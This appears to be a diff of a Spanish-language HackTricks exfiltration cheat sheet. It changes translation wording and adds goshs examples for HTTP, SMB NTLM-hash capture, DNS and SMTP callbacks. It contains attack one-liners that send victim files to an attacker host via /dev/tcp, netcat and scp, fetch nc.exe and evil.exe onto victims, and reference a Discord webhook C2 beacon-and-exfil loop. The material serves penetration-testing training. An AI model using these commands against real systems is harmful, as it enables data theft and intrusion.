@@ -3,15 +3,15 @@
 {{#include ../banners/hacktricks-training.md}}
 
 > [!TIP]
-> Para un ejemplo end-to-end de staging loot en `C:\Users\Public` y exfiltrarlo con Rclone para imitar copias de seguridad legítimas, revisa el flujo de trabajo a continuación.
+> Para un ejemplo de extremo a extremo de preparar loot en `C:\Users\Public` y exfiltrarlo con Rclone para imitar backups legítimos, revisa el flujo de trabajo abajo.
 
 {{#ref}}
 ../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
 {{#endref}}
 
-## Commonly whitelisted domains to exfiltrate information
+## Dominios comúnmente whitelisted para exfiltrar información
 
-Consulta [https://lots-project.com/](https://lots-project.com/) para encontrar dominios comúnmente permitidos en listas blancas que pueden ser abusados
+Consulta [https://lots-project.com/](https://lots-project.com/) para encontrar dominios comúnmente whitelisted que puedan ser abusados
 
 ## Copy\&Paste Base64
 
@@ -107,14 +107,47 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## Webhooks (Discord/Slack/Teams) para C2 & Data Exfiltration
+### goshs
 
-Los Webhooks son endpoints HTTPS de solo escritura que aceptan JSON y partes de archivo opcionales. Normalmente se permiten en dominios SaaS de confianza y no requieren OAuth/API keys, lo que los hace útiles para beaconing y exfiltration de baja fricción.
+[goshs](https://github.com/patrickhener/goshs) es un reemplazo de un solo binario para `python3 -m http.server`
+con funciones de upload, download, WebDAV, SFTP, SMB, TLS, authentication, share links,
+y colaboración OOB (DNS, SMTP, captura de hash NTLM).
+```bash
+# Serve current directory on port 8000
+goshs
 
-Ideas clave:
+# Serve with HTTPS (self-signed)
+goshs -s -ss
+
+# Serve with basic auth
+goshs -b user:password
+
+# Upload-only mode
+goshs -uo
+
+# Read-only mode
+goshs -ro
+
+# Capture SMB NTLM hashes
+goshs -smb -smb-domain CORP
+
+# DNS callback server
+goshs -dns -dns-ip 10.10.10.10
+
+# SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+
+# Tunnel via localhost.run (no port forwarding needed)
+goshs -tunnel
+```
+## Webhooks (Discord/Slack/Teams) para C2 y Data Exfiltration
+
+Los webhooks son endpoints HTTPS de solo escritura que aceptan JSON y partes de archivo opcionales. Por lo general, están permitidos hacia dominios SaaS de confianza y no requieren OAuth/API keys, lo que los hace útiles para beaconing y exfiltration con poca fricción.
+
+Key ideas:
 - Endpoint: Discord usa https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data con una parte llamada payload_json que contiene {"content":"..."} y parte(s) de archivo opcional(es) llamadas file.
-- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirman la entrega.
+- POST multipart/form-data con una parte llamada payload_json que contiene {"content":"..."} y partes de archivo opcionales llamadas file.
+- Patrón de bucle del operador: beacon periódico -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirma la entrega.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -185,8 +218,8 @@ Start-Sleep -Seconds 20
 }
 ```
 Notas:
-- Patrones similares se aplican a otras plataformas de colaboración (Slack/Teams) que usan sus incoming webhooks; ajuste la URL y el esquema JSON según corresponda.
-- Para DFIR de artefactos de caché de Discord Desktop y recuperación de webhook/API, ver:
+- Patrones similares se aplican a otras plataformas de colaboración (Slack/Teams) usando sus incoming webhooks; ajusta la URL y el esquema JSON en consecuencia.
+- Para DFIR de artefactos de caché de Discord Desktop y recuperación de webhook/API, consulta:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -194,12 +227,12 @@ Notas:
 
 ## FTP
 
-### Servidor FTP (python)
+### FTP server (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### Servidor FTP (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -222,7 +255,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Windows** cliente
+### **Cliente de Windows**
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -235,14 +268,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali como server
+Kali como servidor
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-O crea un recurso compartido smb **usando samba**:
+O crea un smb share **using samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -265,15 +298,25 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
+### goshs
+[goshs](https://github.com/patrickhener/goshs) es una alternativa de binario único
+que sirve archivos sobre SMB y captura hashes NetNTLMv2 de los clientes que se conectan:
+```bash
+# Start SMB server with NTLM hash capture
+goshs -smb -smb-domain CORP
+
+# Also works for plain HTTP file serving
+goshs
+```
 ## SCP
 
-El atacante debe tener SSHd en ejecución.
+El atacante tiene que tener SSHd en ejecución.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Si la víctima tiene SSH, el atacante puede montar un directorio de la víctima en la máquina del atacante.
+Si la víctima tiene SSH, el atacante puede montar un directorio de la víctima en el atacante.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -286,12 +329,12 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Descargar archivo de la víctima
+### Descargar archivo desde la víctima
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Subir archivo a la víctima
+### Subir archivo al objetivo
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -320,13 +363,27 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Si puedes enviar datos a un servidor SMTP, puedes crear un servidor SMTP para recibir los datos con python:
+Si puedes enviar datos a un servidor SMTP, puedes crear un SMTP para recibir los datos con python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
+### goshs
+
+[goshs](https://github.com/patrickhener/goshs) puede levantar rápidamente un servidor SMTP
+para capturar callbacks de email durante escenarios de exfiltration OOB:
+```bash
+# Start SMTP callback server
+goshs -smtp -smtp-domain [REDACTED]
+```
+Los correos electrónicos y callbacks recibidos se muestran directamente en la salida del terminal.
+Se puede combinar con el servidor de callback DNS para una cobertura OOB completa:
+```bash
+# DNS + SMTP combined
+goshs -dns -dns-ip 10.10.10.10 -smtp -smtp-domain [REDACTED]
+```
 ## TFTP
 
-Por defecto en XP y 2003 (en otros sistemas necesita añadirse explícitamente durante la instalación)
+Por defecto en XP y 2003 (en otros sistemas debe agregarse explícitamente durante la instalación)
 
 En Kali, **start TFTP server**:
 ```bash
@@ -346,7 +403,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Descargar un archivo con un PHP oneliner:
+Descarga un archivo con un oneliner de PHP:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -388,21 +445,22 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-El programa `debug.exe` no solo permite la inspección de binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hex**. Esto significa que, proporcionando un hex de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante señalar que debug.exe tiene una **limitación para ensamblar archivos de hasta 64 kb de tamaño**.
+El programa `debug.exe` no solo permite inspeccionar binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hex**. Esto significa que, proporcionando un hex de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante señalar que `debug.exe` tiene una **limitación al ensamblar archivos de hasta 64 kb de tamaño**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Luego pega el texto en el windows-shell y se creará un archivo llamado nc.exe.
+Luego copia y pega el texto en el windows-shell y se creará un archivo llamado nc.exe.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
 - [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
+- [https://github.com/patrickhener/goshs](https://github.com/patrickhener/goshs)
 
-## Referencias
+## References
 
 - [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
